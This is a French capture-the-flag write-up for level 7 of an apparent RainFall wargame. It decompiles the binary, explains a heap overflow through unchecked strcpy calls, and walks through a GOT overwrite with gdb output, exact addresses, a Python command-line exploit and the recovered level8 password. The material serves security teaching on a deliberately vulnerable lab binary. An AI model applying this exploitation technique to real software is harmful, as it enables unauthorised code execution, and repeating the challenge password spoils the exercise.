# Level 7: Exploitation d'un Heap Overflow pour réécrire la GOT

## Aperçu du défi

Le level 7 s'appuie sur les concepts de heap overflow vus dans le level 6, mais introduit une technique d'exploitation plus complexe: la réécriture de la GOT (Global Offset Table).

## Code Source

En utilisant Ghidra, nous pouvons obtenir une représentation du code source du binaire:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[68]; // Buffer global utilisé par les deux fonctions

void m(void *unused1, int unused2, char *unused3, int unused4, int unused5)
{
  time_t current_time;

  current_time = time(NULL);
  printf("%s - %d\n", c, current_time);
  return;
}

int main(int argc, char **argv)
{
  int *first_struct;
  void *temp_ptr;
  int *second_struct;
  FILE *password_file;

  first_struct = (int *)malloc(8);
  *first_struct = 1;
  temp_ptr = malloc(8);
  first_struct[1] = (int)temp_ptr;

  second_struct = (int *)malloc(8);
  *second_struct = 2;
  temp_ptr = malloc(8);
  second_struct[1] = (int)temp_ptr;

  strcpy((char *)first_struct[1], argv[1]);
  strcpy((char *)second_struct[1], argv[2]);

  password_file = fopen("/home/user/level8/.pass", "r");
  fgets(c, 68, password_file);
  puts("~~");
  return 0;
}
```

## Analyse du Code Source

En examinant ce code, nous pouvons identifier plusieurs aspects intéressants:

1. Il existe un buffer global `c` qui stockera le mot de passe depuis le fichier `.pass`
2. La fonction `m()` existe mais n'est jamais appelée depuis `main()`
3. Cette fonction `m()` afficherait le contenu du buffer `c` si elle était appelée
4. Le programme crée deux paires de structures allouées dynamiquement:

   - `first_struct[0]` contient la valeur 1
   - `first_struct[1]` pointe vers un autre buffer qui est rempli avec argv[1]
   - `second_struct[0]` contient la valeur 2
   - `second_struct[1]` pointe vers un autre buffer qui est rempli avec argv[2]

   Il est important de comprendre que `strcpy` n'écrit pas directement dans les champs de la structure, mais plutôt dans la mémoire vers laquelle ces champs pointent:

   ```
   ┌───────────────┐          ┌───────────────┐
   │ first_struct  │          │  buffer       │
   │ ┌───────────┐ │          │  alloué       │
   │ │ valeur: 1 │ │          │               │
   │ └───────────┘ │          │  (argv[1]     │
   │ ┌───────────┐ │  pointe  │   est copié   │
   │ │ pointeur ─┼─┼─────────>│   ici)        │
   │ └───────────┘ │          │               │
   └───────────────┘          └───────────────┘
   ```

   Lorsque `strcpy((char *)first_struct[1], argv[1])` est appelé, il écrit à l'adresse mémoire stockée dans `first_struct[1]`, et non pas dans `first_struct[1]` lui-même. Le cast `(char *)` indique à strcpy de traiter cette adresse comme une destination pour écrire des données de chaîne.

5. Les deux appels à `strcpy()` sont vulnérables à un buffer overflow car ils ne vérifient pas la taille des entrées

## Vulnérabilité

La vulnérabilité réside dans les appels à `strcpy()` qui ne vérifient pas les limites. Cela permet à un attaquant de:

1. Provoquer un débordement du premier buffer et écraser la valeur de `second_struct[1]`
2. Modifier l'adresse où le second `strcpy()` écrit ses données
3. Obtenir une primitive d'écriture arbitraire (écrire n'importe quelle valeur à n'importe quelle adresse mémoire accessible en écriture)

## Stratégie d'Exploitation

Notre objectif est de faire appeler la fonction `m()` par le programme, ce qui affichera le mot de passe contenu dans le buffer global `c`.

La stratégie est la suivante:

1. Utiliser le premier overflow de `strcpy()` pour modifier `second_struct[1]` afin qu'il pointe vers l'entrée GOT de `puts`
2. Utiliser le second `strcpy()` pour remplacer l'entrée GOT de `puts` par l'adresse de la fonction `m`
3. Quand le programme appellera `puts("~~")` à la fin, il exécutera en réalité `m()`
4. La fonction `m()` affichera alors le mot de passe qui a été lu dans le buffer global `c`

Voici une représentation visuelle de notre attaque:

```
État initial:
┌────────────────┐      ┌────────────┐      ┌────────────────┐      ┌────────────┐
│ first_struct   │      │ buffer1    │      │ second_struct  │      │ buffer2    │
├────────────────┤      ├────────────┤      ├────────────────┤      ├────────────┤
│ [0]: valeur 1  │      │            │      │ [0]: valeur 2  │      │            │
├────────────────┤      │            │      ├────────────────┤      │            │
│ [1]: ──────────┼─────>│ (argv[1])  │      │ [1]: ──────────┼─────>│ (argv[2])  │
└────────────────┘      └────────────┘      └────────────────┘      └────────────┘

Étape 1: Débordement de buffer1 pour modifier second_struct[1]
┌────────────────┐      ┌────────────────────────────────────────────┐
│ first_struct   │      │ buffer1                                    │
├────────────────┤      ├───────────────────────────┬────────────────┤
│ [0]: valeur 1  │      │                           │                │
├────────────────┤      │                           │                │
│ [1]: ──────────┼─────>│ AAAAA...                  │ 0x8049928(GOT) │───┐
└────────────────┘      └───────────────────────────┴────────────────┘   │
                                                    ▲                    │
                                                    │                    │
┌────────────────┐      ┌────────────┐              │                    │
│ second_struct  │      │ buffer2    │              │                    │
├────────────────┤      ├────────────┤              │                    │
│ [0]: valeur 2  │      │            │              │                    │
├────────────────┤      │            │              │                    │
│ [1]: ──────────┼─────>│ (argv[2])  │              │                    │
└────────────────┘      └────────────┘              │                    │
                                                    │                    │
                        2ème strcpy écrit ici ──────┘                    │
                                                                         │
Étape 2: Utiliser second_struct[1] (qui pointe maintenant vers la GOT)   │
         pour écrire l'adresse de m                                      │
                                                                         │
                      Table d'Offset Global (GOT)                        │
                      ┌────────────────────────┐                         │
                      │ ...                    │                         │
                      ├────────────────────────┤                         │
                      │ puts: 0x08048400       │<────────────────────────┘
                      │       ↓                │
                      │       0x080484f4       │ ← Remplacé par l'adresse de m()
                      ├────────────────────────┤
                      │ ...                    │
                      └────────────────────────┘

Étape 3: Quand le programme appelle puts("~~"), il saute vers m() à la place

┌────────────┐     ┌───────────────┐     ┌───────────────────────┐
│ main()     │     │ puts@plt      │     │ m()                   │
│            │     │               │     │                       │
│ ...        │     │               │     │ printf("%s - %d", c); │
│ puts("~~") │────>│ jmp *0x8049928│────>│                       │
│ ...        │     │               │     │                       │
└────────────┘     └───────────────┘     └───────────────────────┘
```

## Étapes d'Exploitation

1. Trouver l'adresse de la fonction `m`:

   ```
   (gdb) disas m
   Dump of assembler code for function m:
      0x080484f4 <+0>:     push   %ebp
      ...
   ```

   L'adresse de `m` est `0x080484f4`

2. Trouver l'entrée GOT pour `puts`:

   ```
   (gdb) disas puts
   Dump of assembler code for function puts@plt:
      0x08048400 <+0>:     jmp    *0x8049928
      ...
   ```

   L'entrée GOT de `puts` se trouve à `0x8049928`.

3. Déterminer l'offset nécessaire pour écraser `second_struct[1]` avec le premier overflow:

   - Nous devons trouver la distance entre le buffer pointé par first_struct[1] (où argv[1] est écrit) et l'emplacement mémoire de second_struct[1]
   - Avec GDB, nous pouvons trouver les adresses des deux emplacements:

   ```
   (gdb) disas main
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt> # malloc pour first_struct
   0x08048536 <+21>:    mov    %eax,0x1c(%esp)
   ...
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt> # malloc pour temp_ptr (first_struct[1])
   0x08048550 <+47>:    mov    %eax,%edx
   ...
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt> # malloc pour second_struct
   0x08048565 <+68>:    mov    %eax,0x18(%esp)
   ```

   - Ajoutons des points d'arrêt après les appels malloc pour examiner les adresses mémoire:

   ```
   (gdb) break *0x08048550   # Après l'affectation de temp_ptr pour first_struct[1]
   (gdb) break *0x08048585   # Après l'affectation de second_struct[1]
   (gdb) run test1 test2

   Breakpoint 1, 0x08048550 in main ()
   (gdb) x $eax                  # Valeur de temp_ptr pour first_struct[1]
   0x804a018:      0x00000000    # C'est ici que argv[1] sera copié

   (gdb) continue
   Breakpoint 2, 0x08048585 in main ()
   (gdb) x $eax             # Examiner second_struct
   0x804a028:      0x00000002
   (gdb) x &0x804a028[1]    # Adresse de second_struct[1]
   0x804a02c:      0x0804a038    # C'est ce que nous voulons écraser
   ```

   - Calcul de l'offset: 0x804a02c - 0x804a018 = 0x14 (20 en décimal)

4. Créer et exécuter l'exploit:
   ```bash
   ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
   ```

Cette commande:

1. Écrase `second_struct[1]` avec l'adresse de l'entrée GOT de `puts` (`0x8049928`) en utilisant le premier argument
2. Écrit l'adresse de la fonction `m` (`0x080484f4`) dans l'entrée GOT en utilisant le second argument
3. Quand le programme appelle `puts("~~")`, il exécute en réalité `m()`
4. La fonction `m()` affiche le contenu du buffer `c` qui contient le mot de passe

## Récupération du Mot de Passe

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9 - 1745411231
```

Le mot de passe pour le level8 est: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
